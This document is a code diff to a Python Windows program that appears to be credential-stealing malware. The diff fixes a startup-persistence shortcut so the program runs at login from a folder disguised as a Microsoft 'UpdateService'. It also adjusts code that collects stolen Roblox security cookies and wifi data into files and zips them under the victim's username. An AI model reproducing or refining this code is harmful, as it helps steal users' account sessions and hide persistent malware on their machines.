@@ -117,7 +117,7 @@ class main():
 			try:
 				shutil.copytree(os.getcwd(), fr"C:\Users\{os.getlogin()}\Appdata\Roaming\Microsoft\UpdateService")
 				shell = win32com.client.Dispatch("WScript.Shell")
-				shortcut = shell.CreateShortCut(fr"C:\Users\{os.getlogin()}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\UpdateService.Ink")
+				shortcut = shell.CreateShortCut(fr"C:\Users\{os.getlogin()}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\UpdateService.lnk")
 				shortcut.IconLocation = fr"C:\Users\{os.getlogin()}\Appdata\Roaming\Microsoft\UpdateService\{self.filename}"
 				shortcut.Targetpath = fr"C:\Users\{os.getlogin()}\Appdata\Roaming\Microsoft\UpdateService\{self.filename}"
 				shortcut.save()
@@ -361,8 +361,9 @@ class main():
 			if open(os.path.join(self.tempfolder, "wifi.txt"), 'r').read() == "": os.remove(os.path.join(self.tempfolder, "wifi.txt"))
 
 	def writeRoblox(self):
-		res = [*set(self.roblosecurity)]
-		open(os.path.join(self.tempfolder, "Roblox.txt"), 'a').write('\n\n'.join(res))
+		if not self.roblosecurity == []:
+			res = [*set(self.roblosecurity)]
+			open(os.path.join(self.tempfolder, "Roblox.txt"), 'a').write('\n\n'.join(res))
 	
 	def zipup(self):
 		with zipfile.ZipFile(os.path.join("C:/Users/"+os.getlogin(), os.getlogin()+"-Odium.zip"), 'a') as zip:
